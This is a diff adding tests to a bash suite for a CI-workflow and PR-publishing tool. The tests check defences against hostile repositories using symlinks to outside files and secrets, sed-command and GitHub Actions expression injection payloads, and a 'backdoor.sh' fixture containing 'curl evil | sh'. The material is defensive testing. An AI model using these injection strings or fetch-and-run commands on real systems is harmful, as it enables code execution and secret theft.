@@ -326,11 +326,15 @@ PY
   tail -n +2 <<<"$scripts" >"$(rt_tmpdir)/artifact.sh"
   out=$(GITHUB_OUTPUT="$(rt_tmpdir)/artifact.out" RUNNER_OS=macOS NAME=rust WORKDIR=./tools/cli/ \
     PATHS=$'target/release/x\ndist/*.tar.gz' bash -eo pipefail "$(rt_tmpdir)/artifact.sh" && cat "$(rt_tmpdir)/artifact.out")
+  delim=$(sed -n '1s/^paths<<//p' <<<"$out")
+  assert_contains "artifact paths use a per-run delimiter" "RT_EOF_" "$delim"
   assert_eq "artifact paths prefixed with the working directory; name made unique" \
-    "$(printf '%s\n' 'paths<<RT_EOF' tools/cli/target/release/x 'tools/cli/dist/*.tar.gz' RT_EOF name=rust-macos-tools-cli)" "$out"
-  out=$(GITHUB_OUTPUT="$(rt_tmpdir)/artifact2.out" RUNNER_OS=Linux NAME='' WORKDIR=. PATHS='a b' \
+    "$(printf '%s\n' "paths<<$delim" tools/cli/target/release/x 'tools/cli/dist/*.tar.gz' "$delim" name=rust-macos-tools-cli)" "$out"
+  out=$(GITHUB_OUTPUT="$(rt_tmpdir)/artifact2.out" RUNNER_OS=Linux NAME='' WORKDIR=. PATHS='a b RT_EOF' \
     bash -eo pipefail "$(rt_tmpdir)/artifact.sh" && cat "$(rt_tmpdir)/artifact2.out")
-  assert_eq "artifact at the repo root" "$(printf '%s\n' 'paths<<RT_EOF' a b RT_EOF name=build-linux)" "$out"
+  delim=$(sed -n '1s/^paths<<//p' <<<"$out")
+  assert_eq "artifact at the repo root; a path named RT_EOF can't end the value" \
+    "$(printf '%s\n' "paths<<$delim" a b RT_EOF "$delim" name=build-linux)" "$out"
 fi
 
 echo
@@ -376,6 +380,136 @@ out=$(rt_publish_pr "$repo" repo-tools/x "t" "b" "$RT_CI_FILE" 2>&1)
 assert_contains "change -> would open PR" "would open a PR from 'repo-tools/x'" "$out"
 assert_contains "dry run shows the diff" "+# $RT_MARKER" "$out"
 RT_DRY_RUN=0
+
+echo
+echo "PR publishing (against a local remote, gh stubbed)"
+# gh stub: "pr list" applies the caller's --jq filter to GH_PR_LIST_JSON;
+# "pr create" prints a fixed URL.
+gh() {
+  local jqf=''
+  case "$1 $2" in
+    "pr list")
+      while (($#)); do
+        [[ $1 != --jq ]] || jqf=$2
+        shift
+      done
+      jq -r "$jqf" <<<"$GH_PR_LIST_JSON"
+      ;;
+    "pr create") echo "https://example.test/pr/new" ;;
+    *) return 1 ;;
+  esac
+}
+origin=$(mktemp -d "$(rt_tmpdir)/origin.XXXXXX")
+git init -q --bare -b main "$origin"
+work=$(new_repo)
+mk "$work" README.md '# hi'
+commit "$work"
+git -C "$work" remote add origin "file://$origin"
+git -C "$work" push -q origin main
+# Someone else pushes the branch: the managed file as repo-tools would write
+# it, plus an unrelated change riding along.
+git -C "$work" checkout -q -b side
+mk "$work" "$RT_CI_FILE" "# $RT_MARKER"
+mk "$work" backdoor.sh 'curl evil | sh'
+commit "$work"
+git -C "$work" push -q origin side:refs/heads/repo-tools/x
+git -C "$work" checkout -q main
+mk "$work" "$RT_CI_FILE" "# $RT_MARKER"
+RT_REPO=test/repo RT_DEFAULT_BRANCH=main
+GH_PR_LIST_JSON='[{"url": "https://example.test/fork-pr", "isCrossRepository": true}]'
+out=$(rt_publish_pr "$work" repo-tools/x "t" "b" "$RT_CI_FILE" 2>&1)
+assert_contains "extra changes on the branch -> branch is re-pushed" "pushed 'repo-tools/x'" "$out"
+assert_not_contains "re-pushed branch drops the extra changes" "backdoor.sh" \
+  "$(git --git-dir="$origin" ls-tree -r --name-only refs/heads/repo-tools/x)"
+assert_contains "a fork's PR from a same-named branch isn't taken for ours" "opened PR: https://example.test/pr/new" "$out"
+git -C "$work" reset -q --hard origin/main
+mk "$work" "$RT_CI_FILE" "# $RT_MARKER"
+GH_PR_LIST_JSON='[{"url": "https://example.test/fork-pr", "isCrossRepository": true},
+  {"url": "https://example.test/our-pr", "isCrossRepository": false}]'
+out=$(rt_publish_pr "$work" repo-tools/x "t" "b" "$RT_CI_FILE" 2>&1)
+assert_contains "identical branch -> not pushed again" "already has these changes" "$out"
+assert_contains "same-repo PR found" "PR already open: https://example.test/our-pr" "$out"
+unset -f gh
+unset GH_PR_LIST_JSON
+
+echo
+echo "Hostile target repos (symlinks, config injection)"
+outside=$(mktemp -d "$(rt_tmpdir)/outside.XXXXXX")
+mkdir -p "$outside/workflows"
+printf 'precious\n' >"$outside/dependabot.yml"
+printf 'precious\n' >"$outside/workflows/ci.yml"
+printf 'PYTHON_TEST=leaked\n' >"$outside/secrets.env"
+
+repo=$(new_repo)
+mkdir -p "$repo/.github"
+ln -s "$outside/dependabot.yml" "$repo/$RT_DEPENDABOT_FILE"
+commit "$repo"
+if RT_FORCE=1 rt_write_managed "$repo" "$RT_DEPENDABOT_FILE" <<<"# $RT_MARKER" 2>/dev/null; then rc=0; else rc=$?; fi
+assert_eq "symlinked managed file not written, even with --force" "1 precious" "$rc $(cat "$outside/dependabot.yml")"
+
+repo=$(new_repo)
+ln -s "$outside" "$repo/.github"
+commit "$repo"
+if rt_write_managed "$repo" "$RT_CI_FILE" <<<"# $RT_MARKER" 2>/dev/null; then rc=0; else rc=$?; fi
+assert_eq "symlinked .github not written through" "1 absent" \
+  "$rc $([[ -e $outside/workflows/repo-tools-ci.yml ]] && echo present || echo absent)"
+RT_CONF=([REPLACE_WORKFLOWS]=ci.yml)
+out=$(rt_replace_workflows "$repo" 2>/dev/null)
+assert_eq "REPLACE_WORKFLOWS doesn't delete through a symlink" " precious" "$out $(cat "$outside/workflows/ci.yml")"
+out=$(rt_list_workflows "$repo" "" 2>&1)
+assert_not_contains "workflows behind a symlink aren't read" "precious" "$out"
+
+repo=$(new_repo)
+mkdir -p "$repo/.github"
+ln -s "$outside/secrets.env" "$repo/$RT_CONF_FILE"
+commit "$repo"
+if (rt_conf_load "$repo") 2>/dev/null; then rc=0; else rc=$?; fi
+assert_eq "symlinked repo-tools.conf refused" "1" "$rc"
+
+repo=$(new_repo)
+mk "$repo" "$RT_CONF_FILE" $'PYTHON_TEST=echo \e]0;title\a\nNODE_TEST=npm test\n'
+commit "$repo"
+rt_conf_load "$repo" 2>/dev/null
+assert_eq "values with control characters dropped" "|npm test" "$(rt_conf PYTHON_TEST)|$(rt_conf NODE_TEST)"
+
+# GNU sed's s///e flag ran the pattern space as a shell command when config
+# values were spliced into a sed program.
+canary="$(rt_tmpdir)/canary"
+repo=$(new_repo)
+mk "$repo" pyproject.toml '[project]'
+mk "$repo" "$RT_CONF_FILE" "PYTHON_LINT=;touch $canary;"$'\n'"PYTHON_BUILD=\\#e;a"$'\n'
+commit "$repo"
+rt_conf_load "$repo"
+out=$(rt_list_workflows "$repo" "$(rt_ci_plan "$repo")" 2>&1)
+assert_eq "config values never run as commands (sed injection)" "absent" "$([[ -e $canary ]] && echo present || echo absent)"
+assert_contains "override shown verbatim" "lint: ;touch $canary; (override)" "$out"
+assert_contains "second override shown verbatim" "build: \\#e;a (override)" "$out"
+
+repo=$(new_repo)
+mk "$repo" pyproject.toml '[project]'
+# shellcheck disable=SC2016 # literal expression
+mk "$repo" "$RT_CONF_FILE" 'PYTHON_TEST=pytest -k "${{ github.head_ref }}"'
+commit "$repo"
+rt_conf_load "$repo"
+if (rt_render_ci "$repo" main >/dev/null) 2>/dev/null; then rc=0; else rc=$?; fi
+assert_eq "\${{ }} expressions in config refused" "1" "$rc"
+repo=$(new_repo)
+# shellcheck disable=SC2016
+mk "$repo" 'svc/${{ github.event.pull_request.title }}/pyproject.toml' '[project]'
+commit "$repo"
+RT_CONF=()
+if (rt_render_ci "$repo" main >/dev/null) 2>/dev/null; then rc=0; else rc=$?; fi
+assert_eq "\${{ in a directory name refused" "1" "$rc"
+RT_CONF=()
+
+for bad in --force -h 'a/b/c' '../x' 'https://github.com/a/b' ''; do
+  if (rt_resolve_repo "$bad") 2>/dev/null; then rc=0; else rc=$?; fi
+  assert_eq "repo name '$bad' refused" "1" "$rc"
+done
+assert_eq "owner/name accepted" "octo/my.repo-1" "$(rt_resolve_repo octo/my.repo-1)"
+
+assert_eq "PR body puts directory names in code spans" \
+  "- \`npm\`: \`.\`, \`@org/pkg\`, \`we'ird\`" "$(printf 'npm\t.,@org/pkg,we`ird\n' | rt_md_plan)"
 
 echo
 echo "Listing existing workflows next to the generated jobs"
@@ -424,6 +558,24 @@ out=$(rt_publish_pr "$repo" repo-tools/ci "t" "b" "$RT_CI_FILE" "$removed" 2>&1)
 assert_contains "the deletion goes into the PR" "-name: CI" "$out"
 assert_contains "dry run lists the deleted file" ".github/workflows/ci.yml" "$out"
 RT_DRY_RUN=0
+
+echo
+echo "Tools installed by the reusable workflows are pinned"
+wfs=("$ROOT"/.github/workflows/{python,node,rust,jvm,terraform,ansible,shell}.yml)
+# Each pattern is an install of the latest release of something.
+for unpinned in 'uvx ruff ' 'uvx poetry ' 'install pytest$' 'install -g corepack$' 'tool: cargo-audit$' 'v=latest'; do
+  hits=$(grep -nE -- "$unpinned" "${wfs[@]}" || true)
+  assert_eq "no unpinned install: $unpinned" "" "$hits"
+done
+all_wfs=$(cat "${wfs[@]}")
+for var in RT_UV_VERSION RT_RUFF_VERSION RT_POETRY_VERSION RT_PYTEST_VERSION RT_COREPACK_VERSION \
+  RT_CARGO_AUDIT_VERSION RT_TERRAFORM_VERSION RT_TFLINT_VERSION; do
+  # Defined once (top-level env, a version) and used at least once.
+  defs=$(grep -cE -- "^  ${var}: v?[0-9]" <<<"$all_wfs" || true)
+  uses=$(grep -c -- "${var}[^:]" <<<"$all_wfs" || true)
+  assert_eq "$var defined once and used" "1 yes" "$defs $([[ $uses -ge 1 ]] && echo yes || echo no)"
+done
+assert_contains "ansible-lint pinned by default" "default: 26." "$(sed -n '/ansible-lint-version:/,/default:/p' "$ROOT/.github/workflows/ansible.yml")"
 
 echo
 echo "Renderer and reusable workflows agree on inputs"
